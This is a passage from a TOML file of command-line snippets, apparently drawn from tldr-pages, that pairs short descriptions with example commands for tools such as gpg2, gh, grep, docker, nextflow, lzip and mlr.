  description = "Start an interactive wizard to open one of many links of the current Firebase project in the default web browser"
  command = "firebase open"
  output = ""

[[snippets]]
  description = "Create random passwords (default password length is 8)"
  command = "apg"
  output = ""

[[snippets]]
  description = "Create a password with at least 1 symbol (S), 1 number (N), 1 uppercase (C), 1 lowercase (L)"
  command = "apg -M SNCL"
  output = ""

[[snippets]]
  description = "Create a password with 16 characters"
  command = "apg -m <16>"
  output = ""

[[snippets]]
  description = "Create a password with maximum length of 16"
  command = "apg -x <16>"
  output = ""

[[snippets]]
  description = "Create a password that doesn't appear in a dictionary (the dictionary file has to be provided)"
  command = "apg -r <path/to/dictionary_file>"
  output = ""

[[snippets]]
  description = "Tag a specific file with multiple tags"
  command = "tmsu tag <path/to/file.mp3> <music> <big-jazz> <mp3>"
  output = ""

[[snippets]]
  description = "Tag multiple files"
  command = "tmsu tag --tags ""<music mp3>"" <*.mp3>"
  output = ""

[[snippets]]
  description = "List tags of specified file(s)"
  command = "tmsu tags <*.mp3>"
  output = ""

[[snippets]]
  description = "List files with specified tag(s)"
  command = "tmsu files <big-jazz> <music>"
  output = ""

[[snippets]]
  description = "List files with tags matching boolean expression"
  command = "tmsu files ""<(year >= 1990 and year <= 2000)> and <grunge>"""
  output = ""

[[snippets]]
  description = "Mount tmsu virtual filesystem to an existing directory"
  command = "tmsu mount <path/to/directory>"
  output = ""

[[snippets]]
  description = "List imported keys"
  command = "gpg2 --list-keys"
  output = ""

[[snippets]]
  description = "Encrypt a specified file for a specified recipient, writing the output to a new file with `.gpg` appended"
  command = "gpg2 --encrypt --recipient <alice@example.com> <path/to/doc.txt>"
  output = ""

[[snippets]]
  description = "Encrypt a specified file with only a passphrase, writing the output to a new file with `.gpg` appended"
  command = "gpg2 --symmetric <path/to/doc.txt>"
  output = ""

[[snippets]]
  description = "Decrypt a specified file, writing the result to `stdout`"
  command = "gpg2 --decrypt <path/to/doc.txt.gpg>"
  output = ""

[[snippets]]
  description = "Import a public key"
  command = "gpg2 --import <path/to/public_key.gpg>"
  output = ""

[[snippets]]
  description = "Export the public key of a specified email address to `stdout`"
  command = "gpg2 --export --armor <alice@example.com>"
  output = ""

[[snippets]]
  description = "Export the private key with a specified email address to `stdout`"
  command = "gpg2 --export-secret-keys --armor <alice@example.com>"
  output = ""

[[snippets]]
  description = "Clone a GitHub repository locally"
  command = "gh repo clone <owner>/<repository>"
  output = ""

[[snippets]]
  description = "Create a new issue"
  command = "gh issue create"
  output = ""

[[snippets]]
  description = "View and filter the open issues of the current repository"
  command = "gh issue list"
  output = ""

[[snippets]]
  description = "View an issue in the default web browser"
  command = "gh issue view --web <issue_number>"
  output = ""

[[snippets]]
  description = "Create a pull request"
  command = "gh pr create"
  output = ""

[[snippets]]
  description = "View a pull request in the default web browser"
  command = "gh pr view --web <pr_number>"
  output = ""

[[snippets]]
  description = "Check out a specific pull request locally"
  command = "gh pr checkout <pr_number>"
  output = ""

[[snippets]]
  description = "Check the status of a repository's pull requests"
  command = "gh pr status"
  output = ""

[[snippets]]
  description = "Set the Personal Access Token (PAT) to login to a particular organization"
  command = "az devops login --organization <organization_url>"
  output = ""

[[snippets]]
  description = "Open a project in the browser"
  command = "az devops project show --project <project_name> --open"
  output = ""

[[snippets]]
  description = "List members of a specific team working on a particular project"
  command = "az devops team list-member --project <project_name> --team <team_name>"
  output = ""

[[snippets]]
  description = "Check the Azure DevOps CLI current configuration"
  command = "az devops configure --list"
  output = ""

[[snippets]]
  description = "Configure the Azure DevOps CLI behavior by setting a default project and a default organization"
  command = "az devops configure --defaults project=<project_name> organization=<organization_url>"
  output = ""

[[snippets]]
  description = "Print marketplace terms"
  command = "az term show --product ""<product_identifier>"" --plan ""<plan_identifier>"" --publisher ""<publisher_identifier>"""
  output = ""

[[snippets]]
  description = "Accept marketplace terms"
  command = "az term accept --product ""<product_identifier>"" --plan ""<plan_identifier>"" --publisher ""<publisher_identifier>"""
  output = ""

[[snippets]]
  description = "Print a file to `stdout` (status and progress messages are sent to `stderr`)"
  command = "ippeveps <path/to/file>"
  output = ""

[[snippets]]
  description = "Print a file from `stdin` to `stdout`"
  command = "<wget -O - https://examplewebsite.com/file> | ippeveps"
  output = ""

[[snippets]]
  description = "Generate by directly inputting text"
  command = "figlet <input_text>"
  output = ""

[[snippets]]
  description = "Use a custom font file"
  command = "figlet <input_text> -f <path/to/font_file.flf>"
  output = ""

[[snippets]]
  description = "Use a font from the default font directory (the extension can be omitted)"
  command = "figlet <input_text> -f <font_filename>"
  output = ""

[[snippets]]
  description = "Pipe command output through FIGlet"
  command = "<command> | figlet"
  output = ""

[[snippets]]
  description = "Show available FIGlet fonts"
  command = "showfigfonts <optional_string_to_display>"
  output = ""

[[snippets]]
  description = "Delete all store paths unused by current generations of each profile"
  command = "sudo nix-collect-garbage --delete-old"
  output = ""

[[snippets]]
  description = "Simulate the deletion of old store paths"
  command = "sudo nix-collect-garbage --delete-old --dry-run"
  output = ""

[[snippets]]
  description = "Delete all store paths older than 30 days"
  command = "sudo nix-collect-garbage --delete-older-than 30d"
  output = ""

[[snippets]]
  description = "Display the username, line, and time of all currently logged-in sessions"
  command = "who"
  output = ""

[[snippets]]
  description = "Display information only for the current terminal session"
  command = "who am i"
  output = ""

[[snippets]]
  description = "Display all available information"
  command = "who -a"
  output = ""

[[snippets]]
  description = "Display all available information with table headers"
  command = "who -a -H"
  output = ""

[[snippets]]
  description = "Convert an XV thumbnail image file to PPM"
  command = "xvminitoppm <path/to/input_file> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Call the first target specified in the Mkfile (usually named "all")"
  command = "mk"
  output = ""

[[snippets]]
  description = "Call a specific target"
  command = "mk <target>"
  output = ""

[[snippets]]
  description = "Call a specific target, executing 4 jobs at a time in parallel"
  command = "NPROC=4 mk <target>"
  output = ""

[[snippets]]
  description = "Force mking of a target, even if source files are unchanged"
  command = "mk -w<target> <target>"
  output = ""

[[snippets]]
  description = "Assume all targets to be out of date. Thus, update `target` and all of its dependencies"
  command = "mk -a <target>"
  output = ""

[[snippets]]
  description = "Keep going as far as possible on error"
  command = "mk -k"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "swift"
  output = ""

[[snippets]]
  description = "Execute a program"
  command = "swift <file.swift>"
  output = ""

[[snippets]]
  description = "Start a new project with the package manager"
  command = "swift package init"
  output = ""

[[snippets]]
  description = "Generate an Xcode project file"
  command = "swift package generate-xcodeproj"
  output = ""

[[snippets]]
  description = "Update dependencies"
  command = "swift package update"
  output = ""

[[snippets]]
  description = "Compile project for release"
  command = "swift build -c release"
  output = ""

[[snippets]]
  description = "Call `ls -la` when any file in the current directory changes"
  command = "watchexec <ls -la>"
  output = ""

[[snippets]]
  description = "Run `make` when any JavaScript, CSS and HTML file in the current directory changes"
  command = "watchexec --exts <js,css,html> make"
  output = ""

[[snippets]]
  description = "Run `make` when any file in the `lib` or `src` directory changes"
  command = "watchexec --watch <lib> --watch <src> <make>"
  output = ""

[[snippets]]
  description = "Call/restart `my_server` when any file in the current directory changes, sending `SIGKILL` to stop the child process"
  command = "watchexec --restart --stop-signal <SIGKILL> <my_server>"
  output = ""

[[snippets]]
  description = "Display the man page for a command"
  command = "man <command>"
  output = ""

[[snippets]]
  description = "Display the man page for a command from section 7"
  command = "man <7> <command>"
  output = ""

[[snippets]]
  description = "List all available sections for a command"
  command = "man -f <command>"
  output = ""

[[snippets]]
  description = "Display the path searched for manpages"
  command = "man --path"
  output = ""

[[snippets]]
  description = "Display the location of a manpage rather than the manpage itself"
  command = "man -w <command>"
  output = ""

[[snippets]]
  description = "Display the man page using a specific locale"
  command = "man <command> --locale=<locale>"
  output = ""

[[snippets]]
  description = "Search for manpages containing a search string"
  command = "man -k ""<search_string>"""
  output = ""

[[snippets]]
  description = "Convert command output to JSON via pipe"
  command = "<ifconfig> | jc <--ifconfig>"
  output = ""

[[snippets]]
  description = "Convert command output to JSON via magic syntax"
  command = "jc <ifconfig>"
  output = ""

[[snippets]]
  description = "Output pretty JSON via pipe"
  command = "<ifconfig> | jc <--ifconfig> -p"
  output = ""

[[snippets]]
  description = "Output pretty JSON via magic syntax"
  command = "jc -p <ifconfig>"
  output = ""

[[snippets]]
  description = "Get the length of a specific string"
  command = "expr length ""<string>"""
  output = ""

[[snippets]]
  description = "Get the substring of a string with a specific length"
  command = "expr substr ""<string>"" <from> <length>"
  output = ""

[[snippets]]
  description = "Match a specific substring against an anchored pattern"
  command = "expr match ""<string>"" '<pattern>'"
  output = ""

[[snippets]]
  description = "Get the first char position from a specific set in a string"
  command = "expr index ""<string>"" ""<chars>"""
  output = ""

[[snippets]]
  description = "Calculate a specific mathematic expression"
  command = "expr <expression1> <+|-|*|/|%> <expression2>"
  output = ""

[[snippets]]
  description = "Get the first expression if its value is non-zero and not null otherwise get the second one"
  command = "expr <expression1> \| <expression2>"
  output = ""

[[snippets]]
  description = "Get the first expression if both expressions are non-zero and not null otherwise get zero"
  command = "expr <expression1> \& <expression2>"
  output = ""

[[snippets]]
  description = "List the `virsh` commands grouped into related categories"
  command = "virsh help"
  output = ""

[[snippets]]
  description = "List the command categories"
  command = "virsh help | grep ""keyword"""
  output = ""

[[snippets]]
  description = "List the commands in a category"
  command = "virsh help <category_keyword>"
  output = ""

[[snippets]]
  description = "Display help for a command"
  command = "virsh help <command>"
  output = ""

[[snippets]]
  description = "Make the RGB colors in a PPM image compatible with NTSC color systems"
  command = "ppmntsc <path/to/input_file.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Make the RGB colors in a PPM image compatible with PAL color systems"
  command = "ppmntsc --pal <path/to/input_file.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Print the number of illegal pixels in the input image to `stderr`"
  command = "ppmntsc --verbose <path/to/input_file.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Output only legal/illegal/corrected pixels, set other pixels to black"
  command = "ppmntsc --<legalonly|illegalonly|correctedonly> <path/to/input_file.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Sync the current local branch with its remote branch"
  command = "git sync"
  output = ""

[[snippets]]
  description = "Sync the current local branch with the remote main branch"
  command = "git sync origin main"
  output = ""

[[snippets]]
  description = "Sync without cleaning untracked files"
  command = "git sync -s <remote_name> <branch_name>"
  output = ""

[[snippets]]
  description = "Test your internet connection and ping speed"
  command = "speed-test"
  output = ""

[[snippets]]
  description = "Print the results as JSON"
  command = "speed-test --json"
  output = ""

[[snippets]]
  description = "Print the results in megabytes per second (MBps)"
  command = "speed-test --bytes"
  output = ""

[[snippets]]
  description = "Print more detailed information"
  command = "speed-test --verbose"
  output = ""

[[snippets]]
  description = "Convert blanks in each file to tabs, writing to `stdout`"
  command = "unexpand <path/to/file>"
  output = ""

[[snippets]]
  description = "Convert blanks to tabs, reading from `stdout`"
  command = "unexpand"
  output = ""

[[snippets]]
  description = "Convert all blanks, instead of just initial blanks"
  command = "unexpand -a <path/to/file>"
  output = ""

[[snippets]]
  description = "Convert only leading sequences of blanks (overrides -a)"
  command = "unexpand --first-only <path/to/file>"
  output = ""

[[snippets]]
  description = "Have tabs a certain number of characters apart, not 8 (enables -a)"
  command = "unexpand -t <number> <path/to/file>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "docker start"
  output = ""

[[snippets]]
  description = "Start a docker container"
  command = "docker start <container>"
  output = ""

[[snippets]]
  description = "Start a container, attaching `stdout` and `stderr` and forwarding signals"
  command = "docker start --attach <container>"
  output = ""

[[snippets]]
  description = "Start one or more containers"
  command = "docker start <container1 container2 ...>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr objdump"
  output = ""

[[snippets]]
  description = "Initialize a new PostgreSQL database cluster"
  command = "pg_ctl -D <data_directory> init"
  output = ""

[[snippets]]
  description = "Start a PostgreSQL server"
  command = "pg_ctl -D <data_directory> start"
  output = ""

[[snippets]]
  description = "Stop a PostgreSQL server"
  command = "pg_ctl -D <data_directory> stop"
  output = ""

[[snippets]]
  description = "Restart a PostgreSQL server"
  command = "pg_ctl -D <data_directory> restart"
  output = ""

[[snippets]]
  description = "Reload the PostgreSQL server configuration"
  command = "pg_ctl -D <data_directory> reload"
  output = ""

[[snippets]]
  description = "Run a pipeline, use cached results from previous runs"
  command = "nextflow run <main.nf> -resume"
  output = ""

[[snippets]]
  description = "Run a specific release of a remote workflow from GitHub"
  command = "nextflow run <user/repo> -revision <release_tag>"
  output = ""

[[snippets]]
  description = "Run with a given work directory for intermediate files, save execution report"
  command = "nextflow run <workflow> -work-dir <path/to/directory> -with-report <report.html>"
  output = ""

[[snippets]]
  description = "Show details of previous runs in current directory"
  command = "nextflow log"
  output = ""

[[snippets]]
  description = "Remove cache and intermediate files for a specific run"
  command = "nextflow clean -force <run_name>"
  output = ""

[[snippets]]
  description = "List all downloaded projects"
  command = "nextflow list"
  output = ""

[[snippets]]
  description = "Pull the latest version of a remote workflow from Bitbucket"
  command = "nextflow pull <user/repo> -hub bitbucket"
  output = ""

[[snippets]]
  description = "Update Nextflow"
  command = "nextflow self-update"
  output = ""

[[snippets]]
  description = "Run the specified command if and only if `stdin` is not empty"
  command = "ifne <command options ...>"
  output = ""

[[snippets]]
  description = "Run the specified command if and only if `stdin` is empty, otherwise pass `stdin` to `stdout`"
  command = "ifne -n <command options ...>"
  output = ""

[[snippets]]
  description = "Compile a vala file, with gtk+"
  command = "valac <path/to/file.vala> --pkg <gtk+-3.0>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "valac --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "valac --version"
  output = ""

[[snippets]]
  description = "List supported file formats"
  command = "mat2 --list"
  output = ""

[[snippets]]
  description = "Remove metadata from a file"
  command = "mat2 <path/to/file>"
  output = ""

[[snippets]]
  description = "Remove metadata from a file and print detailed output to the console"
  command = "mat2 --verbose <path/to/file>"
  output = ""

[[snippets]]
  description = "Show metadata in a file without removing it"
  command = "mat2 --show <path/to/file>"
  output = ""

[[snippets]]
  description = "Partially remove metadata from a file"
  command = "mat2 --lightweight <path/to/file>"
  output = ""

[[snippets]]
  description = "Remove metadata from a file in place, without creating a backup"
  command = "mat2 --inplace <path/to/file>"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "bundletool help <subcommand>"
  output = ""

[[snippets]]
  description = "Generate APKs from an application bundle (prompts for keystore password)"
  command = "bundletool build-apks --bundle=<path/to/bundle.aab> --ks=<path/to/key.keystore> --ks-key-alias=<key_alias> --output=<path/to/file.apks>"
  output = ""

[[snippets]]
  description = "Generate APKs from an application bundle giving the keystore password"
  command = "bundletool build-apks --bundle=<path/to/bundle.aab> --ks=<path/to/key.keystore> --ks-key-alias=<key_alias> –ks-pass=<pass:the_password> --output=<path/to/file.apks>"
  output = ""

[[snippets]]
  description = "Generate APKs including only one single APK for universal usage"
  command = "bundletool build-apks --bundle=<path/to/bundle.aab> --mode=<universal> --ks=<path/to/key.keystore> --ks-key-alias=<key_alias> --output=<path/to/file.apks>"
  output = ""

[[snippets]]
  description = "Install the right combination of APKs to an emulator or device"
  command = "bundletool install-apks --apks=<path/to/file.apks>"
  output = ""

[[snippets]]
  description = "Estimate the download size of an application"
  command = "bundletool get-size total --apks=<path/to/file.apks>"
  output = ""

[[snippets]]
  description = "Generate a device specification JSON file for an emulator or device"
  command = "bundletool get-device-spec --output=<path/to/file.json>"
  output = ""

[[snippets]]
  description = "Verify a bundle and display detailed information about it"
  command = "bundletool validate --bundle=<path/to/bundle.aab>"
  output = ""

[[snippets]]
  description = "Install a package"
  command = "pip install <package>"
  output = ""

[[snippets]]
  description = "Install a specific version of a package"
  command = "pip install <package>==<version>"
  output = ""

[[snippets]]
  description = "Install packages listed in a file"
  command = "pip install -r <path/to/requirements.txt>"
  output = ""

[[snippets]]
  description = "Install packages from an URL or local file archive (.tar.gz | .whl)"
  command = "pip install --find-links <url|path/to/file>"
  output = ""

[[snippets]]
  description = "Install the local package in the current directory in develop (editable) mode"
  command = "pip install --editable <.>"
  output = ""

[[snippets]]
  description = "Import a VM from an OVF or OVA file"
  command = "VBoxManage import <path/to/file.ovf>"
  output = ""

[[snippets]]
  description = "Set the name of the imported VM"
  command = "VBoxManage import <path/to/file.ovf> --name <vm_name>"
  output = ""

[[snippets]]
  description = "Indicate the folder where the configuration of the imported VM will be stored"
  command = "VBoxManage import <path/to/file.ovf> --basefolder <path/to/directory>"
  output = ""

[[snippets]]
  description = "Register the imported VM in VirtualBox"
  command = "VBoxManage import <path/to/file.ovf> --register"
  output = ""

[[snippets]]
  description = "Perform a dry run to check the import without actually importing"
  command = "VBoxManage import <path/to/file.ovf> --dry-run"
  output = ""

[[snippets]]
  description = "Set the guest OS type (one of `VBoxManage list ostypes`) for the imported VM"
  command = "VBoxManage import <path/to/file.ovf> --ostype=<ostype>"
  output = ""

[[snippets]]
  description = "Set the memory (in megabytes) for the imported VM"
  command = "VBoxManage import <path/to/file.ovf> --memory=<1>"
  output = ""

[[snippets]]
  description = "Set the number of CPUs for the imported VM"
  command = "VBoxManage import <path/to/file.ovf> --cpus=<1>"
  output = ""

[[snippets]]
  description = "Generate a `.phan/config.php` in the current directory"
  command = "phan --init"
  output = ""

[[snippets]]
  description = "Generate a Phan configuration file using a specific level (1 being strictest to 5 being the least strict)"
  command = "phan --init --init-level <level>"
  output = ""

[[snippets]]
  description = "Analyze the current directory"
  command = "phan"
  output = ""

[[snippets]]
  description = "Analyze one or more directories"
  command = "phan --directory <path/to/directory> --directory <path/to/another_directory>"
  output = ""

[[snippets]]
  description = "Specify a configuration file (defaults to `.phan/config.php`)"
  command = "phan --config-file <path/to/config.php>"
  output = ""

[[snippets]]
  description = "Specify the output mode"
  command = "phan --output-mode <text|verbose|json|csv|codeclimate|checkstyle|pylint|html>"
  output = ""

[[snippets]]
  description = "Specify the number of parallel processes"
  command = "phan --processes <number_of_processes>"
  output = ""

[[snippets]]
  description = "Convert to a tab-delimited file (TSV)"
  command = "csvformat -T <data.csv>"
  output = ""

[[snippets]]
  description = "Convert delimiters to a custom character"
  command = "csvformat -D ""<custom_character>"" <data.csv>"
  output = ""

[[snippets]]
  description = "Convert line endings to carriage return (^M) + line feed"
  command = "csvformat -M ""<\r\n>"" <data.csv>"
  output = ""

[[snippets]]
  description = "Minimize use of quote characters"
  command = "csvformat -U 0 <data.csv>"
  output = ""

[[snippets]]
  description = "Maximize use of quote characters"
  command = "csvformat -U 1 <data.csv>"
  output = ""

[[snippets]]
  description = "Start a new named session"
  command = "zellij --session <name>"
  output = ""

[[snippets]]
  description = "List existing sessions"
  command = "zellij list-sessions"
  output = ""

[[snippets]]
  description = "Attach to the most recently used session"
  command = "zellij attach"
  output = ""

[[snippets]]
  description = "Open a new pane (inside a zellij session)"
  command = "<Alt> + N"
  output = ""

[[snippets]]
  description = "Detach from the current session (inside a zellij session)"
  command = "<Ctrl> + O, D"
  output = ""

[[snippets]]
  description = "Create a torrent with 2048 KB as the piece size"
  command = "transmission-create -o <path/to/example.torrent> --tracker <tracker_announce_url> --piecesize <2048> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Create a private torrent with a 2048 KB piece size"
  command = "transmission-create -p -o <path/to/example.torrent> --tracker <tracker_announce_url> --piecesize <2048> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Create a torrent with a comment"
  command = "transmission-create -o <path/to/example.torrent> --tracker <tracker_url1> -c <comment> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Create a torrent with multiple trackers"
  command = "transmission-create -o <path/to/example.torrent> --tracker <tracker_url1> --tracker <tracker_url2> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Display help page"
  command = "transmission-create --help"
  output = ""

[[snippets]]
  description = "Convert tldr-pages files and save into the same directories"
  command = "md-to-clip <path/to/page1.md path/to/page2.md ...>"
  output = ""

[[snippets]]
  description = "Convert tldr-pages files and save into a specific directory"
  command = "md-to-clip --output-directory <path/to/directory> <path/to/page1.md path/to/page2.md ...>"
  output = ""

[[snippets]]
  description = "Convert a tldr-page file to `stdout`"
  command = "md-to-clip --no-file-save <(echo '<page-content>')"
  output = ""

[[snippets]]
  description = "Convert tldr-pages files while recognizing additional placeholders from a specific config"
  command = "md-to-clip --special-placeholder-config <path/to/config.yaml> <path/to/page1.md path/to/page2.md ...>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "md-to-clip --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "md-to-clip --version"
  output = ""

[[snippets]]
  description = "Download a torrent"
  command = "webtorrent download ""<torrent_id>"""
  output = ""

[[snippets]]
  description = "Stream a torrent to VLC media player"
  command = "webtorrent download ""<torrent_id>"" --vlc"
  output = ""

[[snippets]]
  description = "Stream a torrent to a Digital Living Network Alliance (DLNA) device"
  command = "webtorrent download ""<torrent_id>"" --dlna"
  output = ""

[[snippets]]
  description = "Display a list of files for a specific torrent"
  command = "webtorrent download ""<torrent_id>"" --select"
  output = ""

[[snippets]]
  description = "Specify a file index from the torrent to download"
  command = "webtorrent download ""<torrent_id>"" --select <index>"
  output = ""

[[snippets]]
  description = "Seed a specific file or directory"
  command = "webtorrent seed <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Create a new torrent file for the specified file path"
  command = "webtorrent create <path/to/file>"
  output = ""

[[snippets]]
  description = "Display information for a magnet URI or `.torrent` file"
  command = "webtorrent info <path/to/file_or_magnet>"
  output = ""

[[snippets]]
  description = "Check the spelling of a file"
  command = "hunspell <path/to/file>"
  output = ""

[[snippets]]
  description = "Check the spelling of a file with the en_US dictionary"
  command = "hunspell -d <en_US> <path/to/file>"
  output = ""

[[snippets]]
  description = "List misspelled words in a file"
  command = "hunspell -l <path/to/file>"
  output = ""

[[snippets]]
  description = "Create a tag value"
  command = "az tag add-value --name <tag_name> --value <tag_value>"
  output = ""

[[snippets]]
  description = "Create a tag in the subscription"
  command = "az tag create --name <tag_name>"
  output = ""

[[snippets]]
  description = "Delete a tag from the subscription"
  command = "az tag delete --name <tag_name>"
  output = ""

[[snippets]]
  description = "List all tags on a subscription"
  command = "az tag list --resource-id /subscriptions/<subscription_id>"
  output = ""

[[snippets]]
  description = "Delete a tag value for a specific tag name"
  command = "az tag remove-value --name <tag_name> --value <tag_value>"
  output = ""

[[snippets]]
  description = "Scan a file or directory for vulnerabilities"
  command = "clamdscan <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Scan data from `stdin`"
  command = "<command> | clamdscan -"
  output = ""

[[snippets]]
  description = "Scan the current directory and output only infected files"
  command = "clamdscan --infected"
  output = ""

[[snippets]]
  description = "Print the scan report to a log file"
  command = "clamdscan --log <path/to/log_file>"
  output = ""

[[snippets]]
  description = "Move infected files to a specific directory"
  command = "clamdscan --move <path/to/quarantine_directory>"
  output = ""

[[snippets]]
  description = "Remove infected files"
  command = "clamdscan --remove"
  output = ""

[[snippets]]
  description = "Use multiple threads to scan a directory"
  command = "clamdscan --multiscan"
  output = ""

[[snippets]]
  description = "Pass the file descriptor instead of streaming the file to the daemon"
  command = "clamdscan --fdpass"
  output = ""

[[snippets]]
  description = "Remove containers"
  command = "docker rm <container1 container2 ...>"
  output = ""

[[snippets]]
  description = "Force remove a container"
  command = "docker rm --force <container1 container2 ...>"
  output = ""

[[snippets]]
  description = "Remove a container and its volumes"
  command = "docker rm --volumes <container>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "docker rm"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr strings"
  output = ""

[[snippets]]
  description = "Create a new identity"
  command = "git bug user create"
  output = ""

[[snippets]]
  description = "Create a new bug"
  command = "git bug add"
  output = ""

[[snippets]]
  description = "You can push your new entry to a remote"
  command = "git bug push"
  output = ""

[[snippets]]
  description = "You can pull for updates"
  command = "git bug pull"
  output = ""

[[snippets]]
  description = "List existing bugs"
  command = "git bug ls"
  output = ""

[[snippets]]
  description = "Filter and sort bugs using a query"
  command = "git bug ls ""<status>:<open> <sort>:<edit>"""
  output = ""

[[snippets]]
  description = "Search for bugs by text content"
  command = "git bug ls ""<search_query>"" baz"
  output = ""

[[snippets]]
  description = "Link a specific object file with no dependencies into an executable"
  command = "ld <path/to/file.o> --output <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Link two object files together"
  command = "ld <path/to/file1.o> <path/to/file2.o> --output <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Dynamically link an x86_64 program to glibc (file paths change depending on the system)"
  command = "ld --output <path/to/output_executable> --dynamic-linker /lib/ld-linux-x86-64.so.2 /lib/crt1.o /lib/crti.o -lc <path/to/file.o> /lib/crtn.o"
  output = ""

[[snippets]]
  description = "Start the server"
  command = "var-dump-server"
  output = ""

[[snippets]]
  description = "Dump the data in an HTML file"
  command = "var-dump-server --format=html > <path/to/file.html>"
  output = ""

[[snippets]]
  description = "Make the server listen on a specific address and port"
  command = "var-dump-server --host <127.0.0.1:9912>"
  output = ""

[[snippets]]
  description = "Search for a pattern within a file"
  command = "grep ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for an exact string (disables regular expressions)"
  command = "grep --fixed-strings ""<exact_string>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for a pattern in all files recursively in a directory, showing line numbers of matches, ignoring binary files"
  command = "grep --recursive --line-number --binary-files=<without-match> ""<search_pattern>"" <path/to/directory>"
  output = ""

[[snippets]]
  description = "Use extended regular expressions (supports `?`, `+`, `{}`, `()` and `|`), in case-insensitive mode"
  command = "grep --extended-regexp --ignore-case ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Print 3 lines of context around, before, or after each match"
  command = "grep --<context|before-context|after-context>=<3> ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Print file name and line number for each match with color output"
  command = "grep --with-filename --line-number --color=always ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for lines matching a pattern, printing only the matched text"
  command = "grep --only-matching ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search `stdin` for lines that do not match a pattern"
  command = "cat <path/to/file> | grep --invert-match ""<search_pattern>"""
  output = ""

[[snippets]]
  description = "Turn a notebook into a paired `.ipynb`/`.py` notebook"
  command = "jupytext --set-formats ipynb,py <notebook.ipynb>"
  output = ""

[[snippets]]
  description = "Convert a notebook to a `.py` file"
  command = "jupytext --to py <notebook.ipynb>"
  output = ""

[[snippets]]
  description = "Convert a `.py` file to a notebook with no outputs"
  command = "jupytext --to notebook <notebook.py>"
  output = ""

[[snippets]]
  description = "Convert a `.md` file to a notebook and run it"
  command = "jupytext --to notebook --execute <notebook.md>"
  output = ""

[[snippets]]
  description = "Update the input cells in a notebook and preserve outputs and metadata"
  command = "jupytext --update --to notebook <notebook.py>"
  output = ""

[[snippets]]
  description = "Update all paired representations of a notebook"
  command = "jupytext --sync <notebook.ipynb>"
  output = ""

[[snippets]]
  description = "Search for a pattern within a file"
  command = "egrep ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for a pattern within multiple files"
  command = "egrep ""<search_pattern>"" <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Search `stdin` for a pattern"
  command = "cat <path/to/file> | egrep <search_pattern>"
  output = ""

[[snippets]]
  description = "Print file name and line number for each match"
  command = "egrep --with-filename --line-number ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for a pattern in all files recursively in a directory, ignoring binary files"
  command = "egrep --recursive --binary-files=<without-match> ""<search_pattern>"" <path/to/directory>"
  output = ""

[[snippets]]
  description = "Search for lines that do not match a pattern"
  command = "egrep --invert-match ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Compare diff files"
  command = "interdiff <old_file> <new_file>"
  output = ""

[[snippets]]
  description = "Compare diff files, ignoring whitespace"
  command = "interdiff -w <old_file> <new_file>"
  output = ""

[[snippets]]
  description = "Archive a file, replacing it with with a compressed version"
  command = "lzip <path/to/file>"
  output = ""

[[snippets]]
  description = "Archive a file, keeping the input file"
  command = "lzip -k <path/to/file>"
  output = ""

[[snippets]]
  description = "Archive a file with the best compression (level=9)"
  command = "lzip -k <path/to/file> --best"
  output = ""

[[snippets]]
  description = "Archive a file at the fastest speed (level=0)"
  command = "lzip -k <path/to/file> --fast"
  output = ""

[[snippets]]
  description = "Test the integrity of compressed file"
  command = "lzip --test <path/to/archive.lz>"
  output = ""

[[snippets]]
  description = "Decompress a file, replacing it with the original uncompressed version"
  command = "lzip -d <path/to/archive.lz>"
  output = ""

[[snippets]]
  description = "Decompress a file, keeping the archive"
  command = "lzip -d -k <path/to/archive.lz>"
  output = ""

[[snippets]]
  description = "List files which are in an archive and show compression stats"
  command = "lzip --list <path/to/archive.lz>"
  output = ""

[[snippets]]
  description = "Display the sound file metadata"
  command = "soxi <path/to/file.wav>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr tlmgr platform"
  output = ""

[[snippets]]
  description = "Pretty-print a CSV file in a tabular format"
  command = "mlr --icsv --opprint cat <example.csv>"
  output = ""

[[snippets]]
  description = "Receive JSON data and pretty print the output"
  command = "echo '{""hello"":""world""}' | mlr --ijson --opprint cat"
  output = ""

[[snippets]]
  description = "Sort alphabetically on a field"
  command = "mlr --icsv --opprint sort -f <field> <example.csv>"
  output = ""

[[snippets]]
  description = "Sort in descending numerical order on a field"
  command = "mlr --icsv --opprint sort -nr <field> <example.csv>"
  output = ""

[[snippets]]
  description = "Convert CSV to JSON, performing calculations and display those calculations"
  command = "mlr --icsv --ojson put '$<newField1> = $<oldFieldA>/$<oldFieldB>' <example.csv>"
  output = ""

[[snippets]]
